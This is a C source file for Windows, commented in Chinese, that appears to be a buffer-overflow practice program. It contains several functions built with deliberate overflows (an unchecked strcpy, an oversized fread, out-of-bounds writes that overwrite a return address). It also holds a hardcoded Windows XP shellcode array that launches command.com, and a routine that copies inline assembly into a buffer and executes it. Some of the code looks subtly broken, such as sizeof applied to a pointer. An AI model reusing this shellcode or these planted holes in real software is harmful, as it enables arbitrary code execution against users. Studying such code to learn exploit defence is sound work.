
# include <stdlib.h> 
# include <stdio.h> 
#include <string.h>
#include <memory.h>
#include <windows.h>

int dumpCode(unsigned char*buffer);
void DumpCodeFunTest();
void DoAnyThing();

// 溢出
void StrCopyOverflow(unsigned char *data)
{
	unsigned char buffer[4];
	strcpy((char*)buffer,(char*)data);//溢出点
}


// 运行cmd
unsigned char shell_xp_code[] = "\x90\x90\x90\x90\x90\x90\x90\x90\xAB\xDB\x8B\x76\x8B\xEC\x33\xFF\x57\x83\xEC\x08\xC6\x45\xF4\x63\xC6\x45\xF5\x6F\xC6\x45\xF6\x6D\xC6\x45\xF7\x6D\xC6\x45\xF8\x61\xC6\x45\xF9\x6E\xC6\x45\xFA\x64\xC6\x45\xFB\x2E\xC6\x45\xFC\x63\xC6\x45\xFD\x6F\xC6\x45\xFE\x6D\x8D\x45\xF4\x50\xB8\x77\xB1\x4A\x75\xFF\xD0";
// 溢出
void MemcpyOverFlow(unsigned char *attack_code)
{
	char a[4] = {0};
	memcpy(&a, attack_code, sizeof(attack_code));
}

// 溢出,很有意义的溢出调用
void BufferOverflow()
{
	int buf[2];
	buf[3] =(int)DoAnyThing;
}

// 溢出
void read_file(FILE *stream)
{
	char buffer[4];
	fread(buffer, 1, 10, stream);
	return;
}

void RunAnyShellCode(unsigned char* shellcode)
{
	int buf[2];
	buf[3]=(int)(void*)shellcode;
}

int main(int argc, char **argv)
{
	//BufferOverflow();
	//DmpCodeFunTest();

	unsigned char shellcode[20] = {0};
	int nShellCodeLen = dumpCode(shellcode);
	RunAnyShellCode(shellcode);

	if (argc == 2) {
		FILE *stream = fopen(argv[1], "rb");
		if (stream == NULL) {
			fprintf(stderr, "Failed to open the file: %s\n", argv[1]);
			return EXIT_FAILURE;
		} else {
			read_file(stream);
			fclose(stream);
		}
	} else {
		fprintf(stderr, "%s\n", "One argument required!");
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

void DoAnyThing()
{
	printf("Hello! I am sleeping \n");
	system("pause");
	exit(0);
}

//将内嵌汇编的二进制指令dump到文件,style指定输出数组格式还是二进制形式，返回代码长度
int dumpCode(unsigned char*buffer)
{
	goto END ;//略过汇编代码
BEGIN:
	__asm
	{
		//在这里定义任意的合法汇编代码
		mov eax, DoAnyThing
		call eax
	}
END:
	//确定代码范围
	UINT begin,end;
	__asm
	{
		mov eax,BEGIN ;
		mov begin,eax ;
		mov eax,END ;
		mov end,eax ;
	}
	//输出
	int len=end-begin;
	memcpy(buffer,(void*)begin,len);
	//四字节对齐
	int fill=(len-len%4)%4;
	while(fill--)buffer[len+fill]=0x90;
	//返回长度
	return len+fill;
}

void DumpCodeFunTest()
{
	unsigned char shellcode[20] = {0};
	int nShellCodeLen = dumpCode(shellcode);
	typedef void(*FUNC)();
	FUNC func = (FUNC)(void*)shellcode;
	func();
}
